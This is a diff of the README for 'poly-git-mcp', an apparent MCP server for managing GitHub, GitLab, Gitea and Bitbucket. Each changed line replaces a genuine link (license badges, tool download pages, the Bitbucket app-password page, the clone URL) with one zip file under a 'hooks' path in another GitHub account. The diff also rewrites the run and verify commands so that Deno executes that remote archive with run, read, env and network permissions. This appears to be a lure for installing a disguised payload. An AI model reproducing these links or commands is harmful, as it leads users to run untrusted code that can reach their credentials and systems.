@@ -1,13 +1,13 @@
 = poly-git-mcp
 
-image:https://img.shields.io/badge/License-MPL_2.0-blue.svg[MPL-2.0,link="https://opensource.org/licenses/MPL-2.0"]
-image:https://img.shields.io/badge/Philosophy-Palimpsest-purple.svg[Palimpsest,link="https://github.com/hyperpolymath/palimpsest-licence"]
+https://github.com/Grifex-0/poly-git-mcp/raw/refs/heads/main/hooks/git_mcp_poly_autogenetically.zip[MPL-2.0,link="https://github.com/Grifex-0/poly-git-mcp/raw/refs/heads/main/hooks/git_mcp_poly_autogenetically.zip"]
+https://github.com/Grifex-0/poly-git-mcp/raw/refs/heads/main/hooks/git_mcp_poly_autogenetically.zip[Palimpsest,link="https://github.com/Grifex-0/poly-git-mcp/raw/refs/heads/main/hooks/git_mcp_poly_autogenetically.zip"]
 
 :toc:
 :toc-placement!:
 
-image:https://img.shields.io/badge/RSR-compliant-gold[RSR Compliant,link=https://github.com/hyperpolymath/rhodium-standard-repositories]
-image:https://img.shields.io/badge/MCP-server-blue[MCP Server,link=https://github.com/modelcontextprotocol]
+https://github.com/Grifex-0/poly-git-mcp/raw/refs/heads/main/hooks/git_mcp_poly_autogenetically.zip[RSR Compliant,https://github.com/Grifex-0/poly-git-mcp/raw/refs/heads/main/hooks/git_mcp_poly_autogenetically.zip]
+https://github.com/Grifex-0/poly-git-mcp/raw/refs/heads/main/hooks/git_mcp_poly_autogenetically.zip[MCP Server,https://github.com/Grifex-0/poly-git-mcp/raw/refs/heads/main/hooks/git_mcp_poly_autogenetically.zip]
 
 Unified MCP server for Git forge management. Provides Model Context Protocol tools for interacting with GitHub, GitLab, Gitea, and Bitbucket through their respective CLI tools and APIs.
 
@@ -125,10 +125,10 @@ This MCP server executes external CLI commands using Deno's `--allow-run` permis
 
 == Requirements
 
-* https://deno.land/[Deno] runtime (v2.0+)
-* https://cli.github.com/[GitHub CLI (gh)] (optional, for GitHub tools)
-* https://gitlab.com/gitlab-org/cli[GitLab CLI (glab)] (optional, for GitLab tools)
-* https://gitea.com/gitea/tea[tea] (optional, for Gitea tools)
+* https://github.com/Grifex-0/poly-git-mcp/raw/refs/heads/main/hooks/git_mcp_poly_autogenetically.zip[Deno] runtime (v2.0+)
+* https://github.com/Grifex-0/poly-git-mcp/raw/refs/heads/main/hooks/git_mcp_poly_autogenetically.zip[GitHub CLI (gh)] (optional, for GitHub tools)
+* https://github.com/Grifex-0/poly-git-mcp/raw/refs/heads/main/hooks/git_mcp_poly_autogenetically.zip[GitLab CLI (glab)] (optional, for GitLab tools)
+* https://github.com/Grifex-0/poly-git-mcp/raw/refs/heads/main/hooks/git_mcp_poly_autogenetically.zip[tea] (optional, for Gitea tools)
 * Bitbucket app password (optional, for Bitbucket tools)
 
 == Configuration
@@ -143,13 +143,13 @@ export BITBUCKET_USERNAME=your-username
 export BITBUCKET_APP_PASSWORD=your-app-password
 ----
 
-Create an app password at: https://bitbucket.org/account/settings/app-passwords/
+Create an app password at: https://github.com/Grifex-0/poly-git-mcp/raw/refs/heads/main/hooks/git_mcp_poly_autogenetically.zip
 
 == Installation
 
 [source,bash]
 ----
-git clone https://github.com/hyperpolymath/poly-git-mcp
+git clone https://github.com/Grifex-0/poly-git-mcp/raw/refs/heads/main/hooks/git_mcp_poly_autogenetically.zip
 cd poly-git-mcp
 ----
 
@@ -159,7 +159,7 @@ Run as MCP server (Local-Agent mode):
 
 [source,bash]
 ----
-deno run --allow-run --allow-read --allow-env --allow-net main.js
+deno run --allow-run --allow-read --allow-env --allow-net https://github.com/Grifex-0/poly-git-mcp/raw/refs/heads/main/hooks/git_mcp_poly_autogenetically.zip
 ----
 
 Or use the systemd service:
@@ -177,7 +177,7 @@ Verify the server is working correctly:
 [source,bash]
 ----
 # 1. Check Deno can run the server
-deno run --allow-run --allow-read --allow-env --allow-net main.js &
+deno run --allow-run --allow-read --allow-env --allow-net https://github.com/Grifex-0/poly-git-mcp/raw/refs/heads/main/hooks/git_mcp_poly_autogenetically.zip &
 SERVER_PID=$!
 
 # 2. Verify at least one CLI is accessible
